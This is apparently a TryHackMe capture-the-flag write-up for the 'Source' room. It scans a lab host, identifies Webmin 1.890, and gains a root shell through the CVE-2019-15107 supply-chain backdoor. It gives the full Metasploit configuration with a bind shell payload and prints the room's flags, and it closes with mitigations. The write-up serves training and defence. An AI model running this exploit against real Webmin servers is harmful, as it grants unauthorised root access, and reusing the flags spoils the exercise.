# CTF Write-Up: [Source](https://tryhackme.com/room/source)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`THM{SUPPLY_CHAIN_COMPROMISE}`

</details>

<details>
<summary>Root Flag</summary>

`THM{UPDATE_YOUR_INSTALL}`

</details>

---

## 1. Reconnaissance

### Nmap

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
```

```bash
nmap -vv -oN Nmap/Detailed -p 22,10000 -A <IP_ADDRESS>
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 7.6p1 | Ubuntu 4ubuntu0.3 |
| 10000 | HTTP | MiniServ 1.890 (Webmin) | HTTPS |

While the registered service name for port 10000 is `snet-sensor-mgmt`, this port is very commonly used by Webmin. Visiting `https://<IP_ADDRESS>:10000` confirmed a **Webmin login page**.

---

## 2. Vulnerability Identification

### searchsploit

```bash
searchsploit webmin
```

```
Webmin 1.920 - Remote Code Execution                                   | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)      | linux/remote/47230.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)          | linux/webapps/47330.rb
```

The target is running **MiniServ 1.890**, which falls within the affected range. The most relevant entries are `Webmin < 1.920 - 'rpc.cgi' Remote Code Execution` and the unauthenticated RCE module `47230.rb`. Both correspond to **CVE-2019-15107** ([NVD](https://nvd.nist.gov/vuln/detail/cve-2019-15107)) — a backdoor secretly introduced into the Webmin source code during a supply chain compromise, allowing unauthenticated remote code execution via the `password_change.cgi` endpoint. Versions 1.882 through 1.921 are affected.

---

## 3. Exploitation — CVE-2019-15107 (Webmin Backdoor)

### Metasploit

```bash
msfconsole
```

```bash
use exploit/linux/http/webmin_backdoor
set RHOSTS <IP_ADDRESS>
set RPORT 10000
set SSL true
set LHOST tun0
set PAYLOAD linux/x64/shell/bind_tcp
set TARGET 1
run
```

> ⚠️ **Note:** Reverse TCP payloads (`cmd/unix/reverse_perl`, `cmd/unix/reverse_netcat`, `linux/x64/meterpreter/reverse_tcp`) all failed to create a session despite the exploit confirming the target as vulnerable. This indicated outbound connections from the target were being blocked. Switching to a **bind TCP payload** (`linux/x64/shell/bind_tcp`) with the **Linux Dropper** target (`TARGET 1`) resolved the issue — the payload is written to disk and executed, opening a port on the target that we connect to rather than waiting for a callback.

```
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/shell/bind_tcp command stager
[*] Command Stager progress - 100.00% done (751/751 bytes)
[*] Started bind TCP handler against <IP_ADDRESS>:4444
[*] Sending stage (38 bytes) to <IP_ADDRESS>
[*] Command shell session 1 opened (192.168.218.226:32867 -> <IP_ADDRESS>:4444)
whoami
root
```

✅ Shell as `root` — Webmin was running as root on this instance, so no privilege escalation was required.

Upgraded to a full TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 4. Flags

### User Flag

```bash
cat /home/dark/user.txt
```

> 🚩 `THM{SUPPLY_CHAIN_COMPROMISE}`

### Root Flag

```bash
cat /root/root.txt
```

> 🚩 `THM{UPDATE_YOUR_INSTALL}`

---

## 5. Attack Chain

```
Nmap Scan
    └─► Port 10000 (MiniServ 1.890) → Webmin login page

searchsploit webmin
    └─► CVE-2019-15107 → Unauthenticated RCE via supply chain backdoor

Metasploit (exploit/linux/http/webmin_backdoor)
    ├─► Reverse payloads blocked (outbound filtering on target)
    └─► bind_tcp + Linux Dropper target → session opened as root

cat /home/dark/user.txt → user flag
cat /root/root.txt      → root flag
```

---

## 6. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | CVE-2019-15107 — Webmin supply chain backdoor (v1.882–1.921). The backdoor was injected into Webmin's source code through a compromise of the project's build and update infrastructure, meaning malicious code was distributed via the official update mechanism rather than through a direct code repository breach | Unauthenticated remote code execution as root | Update Webmin to a patched version immediately; verify software integrity via checksums before deployment; monitor vendor security advisories |
| 2 | Webmin running as root by default | Any RCE via Webmin yields full system compromise. Note that Webmin can be configured to run under reduced privileges — this is a misconfiguration rather than an unavoidable default | Configure Webmin to run under a dedicated low-privilege service account; avoid running administrative tools as root unless strictly necessary |
| 3 | Webmin exposed directly on a public interface | Attack surface accessible without network restrictions | Restrict access to Webmin via firewall rules; place behind a VPN or allow-list trusted IPs only |

---

*Source — TryHackMe | Rooted ✅*
